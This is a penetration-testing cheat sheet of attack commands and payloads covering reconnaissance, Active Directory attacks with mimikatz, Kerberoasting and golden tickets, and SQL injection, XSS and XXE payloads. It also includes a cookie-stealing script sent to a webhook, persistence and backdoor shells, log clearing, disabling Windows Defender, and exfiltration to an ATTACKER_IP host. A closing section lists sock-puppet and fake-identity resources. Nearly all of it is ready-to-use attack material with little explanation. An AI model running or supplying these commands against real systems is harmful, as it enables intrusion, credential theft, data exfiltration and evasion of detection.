# Hacksheet Extract

### Target Validation

```
https://bgp.he.net/
```

Validate IP ownership and confirm ranges for scanning.

---

### DNS Enumeration

```
nslookup <ip>
dig -x <ip>
whois <ip>
```

Check if IP resolves to a hostname; proceed with web enumeration if valid.

---

### Nmap Scan

```
nmap -T4 -p- -A <target> -oN nmap_scan.txt
```

Enumerate all ports, services, software versions, and potential vulnerabilities.

---

### Nessus Scan

```
Run full Nessus TCP scan on all ports and export results as .nessus, .html, .pdf
```

Scan target for vulnerabilities across all TCP ports and generate detailed report.

---

### Parse Nessus Scan

```
perl parse_nessus_xml.v24.pl -f scan.nessus
```

Parse Nessus XML and organize results in Excel with IP, Port, Service, CVSS, etc.

---

### Confirm Web Presence

```
Visit http://<ip> or use whatweb <ip>
```

Verify if the target hosts a website to proceed with web enumeration.

---

### Nikto Scan

```
nikto -h http[s]://<target>
```

Scan web server for vulnerabilities, default files, headers, and misconfigurations.

---

### Web Enumeration Script

```
./run.sh <url>
```

Automates subdomain enumeration, tech fingerprinting, archived URLs, screenshots, and takeover detection.

---

### DNS Enumeration on Domain

```
dnsrecon -d example.com
dnsrecon -r <IP-Range> -n <DNS-Server-IP>
```

Enumerate DNS records, subdomains, and possible zone transfers.

---

### Tech Detection (Fingerprinting)

```
nc -v example.com 80
GET / HTTP/1.0
```

Manually detect web technologies using BuiltWith, Wappalyzer, and network requests.

---

### Subdomain Enumeration

```
https://crt.sh/?q=%25example.com
python3 bluto.py -t example.com -a -d
```

Enumerate subdomains using Certificate Transparency logs and automated tools.

---

### Source Code & Page Analysis

Manually review web pages for comments, hidden inputs, credentials, and debug info.

---

### Robots.txt Check

```
Visit http[s]://<target>/robots.txt
```

Identify disallowed paths or sensitive endpoints listed in robots.txt.

---

### Gobuster Directory Scan

```
gobuster dir -u http://<target> -w /path/to/wordlist.txt -o gobuster.txt
```

Discover hidden directories and files on the web server.

---

### Dirbuster GUI Scan

```
GUI-based, save report to HTML/TXT/XML
```

Detect directories/files using a GUI interface for wordlist-based enumeration.

---

### FFUF Scan

```
ffuf -u http://<target>/FUZZ -w /path/to/wordlist.txt -o results.html -of html
```

Discover hidden paths or endpoints using fuzzing with a wordlist.

---

### SMB Enumeration

```
smbclient -L \\TARGET_IP -U username
```

List SMB shares and test access to enumerate available resources.

---

### SMB Mapping with CrackMapExec

```
crackmapexec smb TARGET_IP -u username -p password --shares
```

Map SMB shares and gather detailed information about access rights.

---

### NFS Mount

```
mount -t nfs TARGET_IP:/share /mnt/nfs
```

Access NFS shares and enumerate files for sensitive data.

---

### SSH Access

```
ssh user@TARGET_IP
```

Gain remote shell access using valid SSH credentials.

---

### SSH Key Exploit

```
ssh -i id_rsa user@TARGET_IP
```

Use discovered private SSH key to access target system.

---

### RDP Access

```
xfreerdp /u:user /p:pass /v:TARGET_IP
```

Remote desktop into the target machine using valid credentials.

---

### iRedAdmin Exploit

```
Login with compromised credentials and reset other passwords
```

Gain admin access to mail panel and reset other user passwords.

---

### Responder LLMNR/NBT-NS Poisoning

```
responder -I INTERFACE
```

Poison LLMNR/NBT-NS traffic to capture hashes from internal hosts.

---

### NTLM Relay Attack

```
ntlmrelayx.py -t TARGET -smb2support
```

Relay captured NTLM authentication to other services for lateral movement.

---

### Password Spraying

```
crackmapexec smb DOMAIN_IP -u usernames.txt -p 'password'
```

Attempt a single common password across multiple accounts to avoid lockouts.

---

### Hash Dumping (Windows)

```
mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'
```

Dump credentials from memory of logged-in users for privilege escalation.

---

### Kerberoasting

```
impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/username:password
```

Request SPN tickets to crack service account passwords from Active Directory.

---

### BloodHound LDAP Enumeration

```
SharpHound.exe -c All
```

Collect Active Directory objects and relationships for privilege escalation analysis.

---

### Password Cracking

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

Crack NTLM hashes for domain users using a wordlist.

---

### LinPEAS Enumeration

```
./linpeas.sh
```

Automated Linux privilege escalation checks to find misconfigurations and credentials.

---

### WinPEAS Enumeration

```
winPEAS.bat
```

Automated Windows privilege escalation checks for misconfigurations and credentials.

---

### MSF Reverse Shell

```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST LOCAL_IP; set LPORT 4444; run"
```

Establish reverse shell from the target to the attacker's machine.

---

### Service Account Enumeration

```
crackmapexec smb DOMAIN_IP -u user -p pass --sessions
```

Enumerate service accounts and their privileges for further exploitation.

---

### Evil-WinRM Access

```
evil-winrm -i TARGET_IP -u username -p password
```

Gain remote shell on Windows systems using WinRM with valid credentials.

---

### Pass-the-Hash

```
pth-winexe -U DOMAIN/username%NTLM_HASH //TARGET_IP cmd.exe
```

Authenticate to a Windows host using NTLM hash without knowing the plaintext password.

---

### Kerberoasting

```
impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/username:password
```

Request SPN tickets to crack service account passwords from Active Directory.

---

### AS-REP Roasting

```
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP
```

Extract AS-REP hashes from users without preauthentication to crack passwords.

---

### NTDS Dump

```
secretsdump.py DOMAIN/username:password@DC_IP
```

Dump Active Directory database and extract user hashes for privilege escalation.

---

### RDP Lateral Movement

```
xfreerdp /u:user /p:pass /v:TARGET_IP
```

Move laterally to other hosts using RDP with valid credentials.

---

### SMB Lateral Movement

```
crackmapexec smb TARGET_IP -u username -p password --exec-method smbexec cmd.exe
```

Execute commands on remote Windows hosts via SMB for lateral movement.

---

### SSH Lateral Movement

```
ssh user@TARGET_IP
```

Move laterally to other systems using SSH credentials or keys.

---

### Kerberos Ticket Pass

```
Rubeus.exe tgt::pass /user:username /password:Password1 /domain:DOMAIN
```

Forge Kerberos tickets to impersonate users for domain access.

---

### Golden Ticket Attack

```
Mimikatz 'kerberos::golden /user:krbtgt /domain:DOMAIN /sid:S-1-5-21-XXXX /aes256:KEY /ticket:golden.kirbi' exit
```

Create a Golden Ticket for persistent domain administrator access.

---

### Silver Ticket Attack

```
Mimikatz 'kerberos::silver /domain:DOMAIN /sid:S-1-5-21-XXXX /service:cifs /target:TARGET /aes256:KEY /ticket:silver.kirbi' exit
```

Create a Silver Ticket to access specific services without full domain compromise.

---

### Domain Admin Privilege Escalation

```
Invoke-PrivilegeEscalation.ps1
```

Script-based enumeration and exploitation to escalate privileges to Domain Admin.

---

### Data Exfiltration via SMB

```
smbclient \\TARGET_IP\share -U user -c 'get secret.txt'
```

Access and download sensitive files from SMB shares after gaining privileges.

---

### Pivoting via SSH Tunnel

```
ssh -L LOCAL_PORT:TARGET_IP:REMOTE_PORT user@INTERMEDIATE_HOST
```

Forward local ports through compromised host to access internal network services.

---

### Pivoting via SSHuttle

```
sshuttle -r user@INTERMEDIATE_HOST 10.10.10.0/24
```

Route internal network traffic through compromised host for network-wide access.

---

### Internal Recon via Nmap

```
nmap -sV -p- 10.10.10.0/24
```

Scan internal network from compromised host to enumerate live hosts and services.

---

### Internal Web Enumeration

```
gobuster dir -u http://INTERNAL_HOST -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_internal.txt
```

Discover hidden directories and files on internal web servers for further exploitation.

---

### Sock Puppet Creation Guide

```
https://web.archive.org/web/20210125191016/https://jakecreps.com/2018/11/02/sock-puppets/
```

Step-by-step guide on creating effective anonymous sock puppet accounts for OSINT.

---

### The Art Of The Sock

```
https://www.secjuice.com/the-art-of-the-sock-osint-humint/
```

OSINT guide on sock puppet accounts and HUMINT techniques.

---

### Reddit Sockpuppet Setup

```
https://www.reddit.com/r/OSINT/comments/dp70jr/my_process_for_setting_up_anonymous_sockpuppet/
```

Reddit walkthrough on setting up anonymous sock puppet accounts for OSINT.

---

### Fake Name Generator

```
https://www.fakenamegenerator.com/
```

Generate realistic fake identities for OSINT or testing purposes.

---

### This Person Does Not Exist

```
https://www.thispersondoesnotexist.com/
```

Generate realistic AI-generated faces for use in OSINT sock puppets.

---

### Privacy.com

```
https://privacy.com/join/LADFC
```

Create virtual cards for privacy in online OSINT research.

---

### Google Search

```
https://www.google.com/
```

Primary search engine for OSINT research.

---

### Google Advanced Search

```
https://www.google.com/advanced_search
```

Advanced operators to filter and refine OSINT queries.

---

### Bing Search

```
https://www.bing.com/
```

Alternate search engine for OSINT with its own operators.

---

### DuckDuckGo

```
https://duckduckgo.com/
```

Privacy-focused search engine suitable for OSINT research.

---

### Google Image Search

```
https://images.google.com
```

Reverse search images to find duplicates or sources online.

---

### Yandex Image Search

```
https://yandex.com
```

Facial recognition and image OSINT searches.

---

### TinEye

```
https://tineye.com
```

Tracks image origins and earliest appearances online.

---

### PimEyes

```
https://pimeyes.com/
```

Face recognition to locate where an image appears online.

---

### Hunter.io

```
https://hunter.io/
```

Find emails associated with a domain or company for OSINT.

---

### DeHashed

```
https://www.deshashed.com/
```

Search for breached passwords and email leaks for OSINT purposes.

---

### NameChk

```
https://namechk.com/
```

Check username availability across multiple platforms for OSINT tracking.

---

### TruePeopleSearch

```
https://www.truepeoplesearch.com/
```

Search for people and contact details for OSINT purposes.

---

### Twitter Advanced Search

```
https://twitter.com/search-advanced
```

Search by keywords, hashtags, date, language, location, or account for OSINT recon.

---

### BuiltWith

```
https://builtwith.com/
```

Identify website technology stack and server info for OSINT.

---

### Shodan

```
https://shodan.io
```

Search for exposed devices, open ports, and services.

---

### whois

```
sudo apt install whois
```

Retrieve domain registration and ownership information for OSINT.

---

### subfinder

```
sudo apt install subfinder
```

Passive subdomain enumeration for OSINT.

---

### assetfinder

```
go install github.com/tomnomnom/assetfinder@latest
```

Find related subdomains and assets for OSINT recon.

---

### httprobe

```
go install github.com/tomnomnom/httprobe@latest
```

Check if subdomains are alive.

---

### gowitness

```
sudo apt install gowitness
```

Take screenshots of alive domains for OSINT documentation.

---

### Windows Local Administrator Enumeration

```
net localgroup administrators
```

List local administrators on a Windows system to identify potential privilege escalation targets.

---

### Linux Sudo Enumeration

```
sudo -l
```

Check which commands can be run with sudo privileges for possible escalation.

---

### Linux SUID/SGID Files

```
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

Locate SUID/SGID files which may be exploited for privilege escalation.

---

### Windows Scheduled Task Enumeration

```
schtasks /query /fo LIST /v
```

Enumerate scheduled tasks to find misconfigured tasks for privilege escalation.

---

### Windows Services Enumeration

```
sc queryex type= service
```

List services and their privileges to identify misconfigured services for privilege escalation.

---

### Linux Cron Jobs Enumeration

```
cat /etc/crontab
ls -la /etc/cron.*
```

Check cron jobs for scripts or binaries that can be exploited for privilege escalation.

---

### Linux Password File Enumeration

```
cat /etc/passwd
```

Enumerate system users to identify possible targets or weak accounts.

---

### Linux Shadow File Enumeration

```
cat /etc/shadow
```

Access hashed passwords for cracking to escalate privileges.

---

### Windows Password Dump via Mimikatz

```
privilege::debug
sekurlsa::logonpasswords
exit
```

Extract plaintext passwords, hashes, PINs, and Kerberos tickets from Windows memory.

---

### Linux Credentials Search

```
grep -iR 'password' /etc /home /var/www
```

Search for hardcoded credentials in configuration files and scripts for escalation opportunities.

---

### Windows Network Shares Enumeration

```
net view \\TARGET_IP
```

List available network shares to locate sensitive files for lateral movement or data exfiltration.

---

### Windows Registry Enumeration

```
reg query HKLM\Software /s
```

Search registry for credentials, configurations, and persistence opportunities.

---

### SQL Injection - Login Bypass

```
' OR 1=1 #
```

Bypass login authentication using always-true condition.

---

### SQL Injection - Count Columns

```
' UNION SELECT NULL #
```

Determine the number of columns for UNION SELECT injection.

---

### SQL Injection - Test String Column

```
' UNION SELECT 'abc', NULL #
```

Identify which column accepts string data in UNION SELECT.

---

### SQL Injection - Get DB Version

```
' UNION SELECT @@version, NULL #
```

Retrieve database version using UNION SELECT injection.

---

### SQL Injection - List Tables

```
' UNION SELECT table_name, NULL FROM information_schema.tables #
```

Enumerate all table names in the database.

---

### SQL Injection - List Columns

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' #
```

Enumerate column names for a known table.

---

### SQL Injection - Dump User Data

```
' UNION SELECT username, password FROM users #
```

Extract usernames and passwords from the users table.

---

### XSS - Prompt Popup

```
<script>prompt('1')</script>
```

Test for XSS by triggering a simple popup.

---

### XSS - Image OnError

```
<img src=x onerror="prompt(1)">
```

Trigger XSS via image tag onerror event.

---

### XSS - Exfiltrate Cookies

```
<script>fetch('https://webhook.site/your-id?cookie=' + document.cookie)</script>
```

Send victim cookies to a webhook to exfiltrate data.

---

### Command Injection - Test

```
http://target.com/page?input=127.0.0.1; whoami; asd
```

Test server execution of system commands via URL parameter.

---

### Command Injection - Reverse Shell PHP

```
php /var/www/html/rev.php
```

Trigger PHP reverse shell on target.

---

### IDOR - Test User Access

```
ffuf -u http://target.com/profile?user=FUZZ -w userids.txt -c -fs 1234
```

Test for insecure direct object references by fuzzing user IDs.

---

### XXE - File Read

```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

Exploit XXE vulnerability to read sensitive server files.

---

### Persistence via Scheduled Task

```
schtasks /create /sc minute /mo 10 /tn TaskName /tr C:\path\payload.exe /ru SYSTEM
```

Maintain persistence on Windows by creating a scheduled task that runs a payload periodically.

---

### Persistence via Registry Run Key

```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TaskName /t REG_SZ /d C:\path\payload.exe
```

Add a payload to the Run key in the Windows registry to execute at login.

---

### Persistence via Service Creation

```
sc create ServiceName binPath= C:\path\payload.exe type= own start= auto
```

Create a new Windows service to execute a payload for persistence.

---

### Linux Cron Job Persistence

```
echo '*/10 * * * * /path/payload.sh' >> /etc/crontab
```

Maintain persistence on Linux systems using cron jobs to periodically execute a script.

---

### Backdoor via Netcat

```
nc -nlvp 4444 -e /bin/bash
```

Create a reverse shell backdoor on Linux for persistent remote access.

---

### Backdoor via Meterpreter

```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST LOCAL_IP; set LPORT 4444; run"
```

Deploy a Meterpreter backdoor for persistent remote access.

---

### Clear Windows Event Logs

```
wevtutil cl System & wevtutil cl Security & wevtutil cl Application
```

Remove traces of activities from Windows event logs to evade detection.

---

### Clear Linux History

```
history -c && rm ~/.bash_history
```

Clear command history to remove traces of commands executed on Linux.

---

### Remove Meterpreter Traces

```
clearev
```

Use Meterpreter to clear its own logs and hide exploitation traces.

---

### Remove Uploaded Files

```
rm /path/to/payload
```

Delete uploaded payloads or scripts after execution to avoid detection.

---

### Dump Sensitive Data

```
powershell -Command 'Get-ChildItem -Path C:\ -Recurse -Include *.docx,*.xlsx,*.pdf'
```

Enumerate and collect sensitive documents from target systems.

---

### Exfiltrate Data via SMB

```
smbclient \\ATTACKER_IP\share -U user -c 'put secret_data.zip'
```

Upload collected sensitive data to attacker-controlled SMB share.

---

### Exfiltrate Data via SCP

```
scp /path/to/data.zip user@ATTACKER_IP:/remote/path
```

Securely transfer collected data from the target system to attacker machine.

---

### Token Impersonation

```
mimikatz 'token::elevate' exit
```

Impersonate higher-privileged user tokens for further post-exploitation actions.

---

### Disable Security Tools

```
sc stop WinDefend & sc stop WdNisSvc
```

Temporarily disable Windows security services to avoid detection during post-exploitation.

---

### Extract Passwords from Browsers

```
powershell -Command 'Get-ChildItem $env:APPDATA\..\Local\Google\Chrome\User Data\Default\Login Data'
```

Extract stored credentials from browser databases on the target system.

---
